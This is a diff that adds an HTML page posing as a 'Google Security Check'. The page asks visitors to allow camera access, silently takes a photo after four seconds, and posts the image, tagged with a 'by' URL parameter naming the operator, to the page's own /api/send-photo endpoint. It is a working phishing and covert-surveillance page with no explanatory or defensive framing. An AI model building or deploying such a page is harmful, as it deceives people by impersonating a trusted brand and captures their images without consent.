@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Security</title>
+</head>
+<body>
+  <h2>Google Security Check</h2>
+  <p>Please allow camera access to continue.</p>
+  <button onclick="startCamera()">Allow Camera</button>
+  <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const username = urlParams.get('by') || 'unknown';
+
+    function startCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.style.display = 'block';
+          video.srcObject = stream;
+          setTimeout(() => {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+
+            const image = canvas.toDataURL('image/jpeg');
+            fetch('/api/send-photo', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: image, username: username })
+            });
+          }, 4000);
+        })
+        .catch(() => alert("Camera access denied."));
+    }
+  </script>
+</body>
+</html>
